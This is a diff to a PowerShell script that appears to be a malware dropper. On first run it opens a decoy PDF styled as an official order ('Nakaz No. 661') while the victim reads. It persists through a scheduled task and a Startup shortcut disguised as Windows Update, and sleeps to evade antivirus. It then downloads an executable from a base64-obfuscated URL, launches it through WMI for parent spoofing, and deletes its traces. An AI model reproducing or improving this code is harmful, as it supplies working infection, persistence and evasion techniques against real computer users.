@@ -1,7 +1,36 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-# === SELF-PRESERVATION ===
-$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
+# === IMMEDIATE CACHE & PDF SETUP ===
+$cache = "$env:APPDATA\Microsoft\Windows\Caches"
+if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
+
+$flagFile = "$cache\installed.flag"
+$isFirstRun = -not (Test-Path $flagFile)
+
+$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
+$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
+
+# === OPEN PDF IMMEDIATELY ON FIRST RUN ===
+if ($isFirstRun) {
+    # Download only if missing (fast WebClient)
+    if (-not (Test-Path $pdfPath)) {
+        try {
+            (New-Object System.Net.WebClient).DownloadFile($pdfUrl, $pdfPath)
+        } catch {}
+    }
+    # Open PDF now – user sees it within 1–2 seconds
+    if (Test-Path $pdfPath) {
+        try { Start-Process $pdfPath } catch {}
+        New-Item -Path $flagFile -ItemType File -Force | Out-Null
+    }
+}
+
+# === EVERYTHING ELSE HAPPENS SILENTLY AFTER PDF IS OPEN ===
+# (Persistence, self-preservation, EXE download & launch)
+# These run while the user is reading the decoy.
+
+# Self-preservation
+$localPath = "$cache\launcher.ps1"
 $currentPath = $MyInvocation.MyCommand.Path
 
 function Save-ScriptToDisk {
@@ -22,7 +51,7 @@ function Save-ScriptToDisk {
 }
 $scriptPath = Save-ScriptToDisk -Destination $localPath
 
-# === PERSISTENCE: Scheduled Task ===
+# Scheduled Task persistence
 $taskName = "WindowsUpdateTask"
 $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if (-not $taskExists) {
@@ -37,7 +66,7 @@ if (-not $taskExists) {
     } catch {}
 }
 
-# === PERSISTENCE: Startup Folder LNK ===
+# Startup LNK persistence
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $lnkPath = "$startupPath\WindowsUpdateHelper.lnk"
 if (-not (Test-Path $lnkPath)) {
@@ -49,44 +78,15 @@ if (-not (Test-Path $lnkPath)) {
     $shortcut.Save()
 }
 
-# === PREPARE CACHE DIRECTORY ===
-$cache = "$env:APPDATA\Microsoft\Windows\Caches"
-if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }
-
-# === FIRST-RUN FLAG ===
-$flagFile = "$cache\installed.flag"
-$isFirstRun = -not (Test-Path $flagFile)
-
-# === URLs AND PATHS (UPDATED WITH COMPRESSED 88 KB PDF) ===
-$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LTQucGRm'))
-$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
-$pdfPath = "$cache\Nakaz_No._661_vid_02.03.2026-4.pdf"
-$exePath = "$cache\helper.exe"
-
-$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
-
-# === QUICK DECOY PDF OPEN (First Run Only) ===
-if ($isFirstRun) {
-    # Download PDF if missing (using WebClient for speed)
-    if (-not (Test-Path $pdfPath)) {
-        try {
-            (New-Object System.Net.WebClient).DownloadFile($pdfUrl, $pdfPath)
-        } catch {}
-    }
-    # Open PDF immediately
-    if (Test-Path $pdfPath) {
-        try { Start-Process $pdfPath } catch {}
-        New-Item -Path $flagFile -ItemType File -Force | Out-Null
-    }
-} else {
-    # Persistence runs: minimal jitter to blend in
-    Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 1500)
-}
-
-# === BEARFOOS EVASION: Long delay before EXE ===
+# Bearfoos evasion delay before EXE
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === DOWNLOAD EXE (with retry) ===
+# EXE URL and path
+$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))
+$exePath = "$cache\helper.exe"
+$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}
+
+# Download EXE with retry
 if (-not (Test-Path $exePath)) {
     $retryCount = 0
     $maxRetries = 3
@@ -101,7 +101,7 @@ if (-not (Test-Path $exePath)) {
     } while ($retryCount -lt $maxRetries)
 }
 
-# === LAUNCH EXE (WMI preferred for parent spoofing) ===
+# Launch EXE
 if (Test-Path $exePath) {
     try {
         $wmiParams = @{
@@ -119,7 +119,7 @@ if (Test-Path $exePath) {
     }
 }
 
-# === CLEANUP AFTER 5 MINUTES ===
+# Cleanup after 5 minutes
 Start-Job -ScriptBlock {
     param($exe, $pdf)
     Start-Sleep -Seconds 300
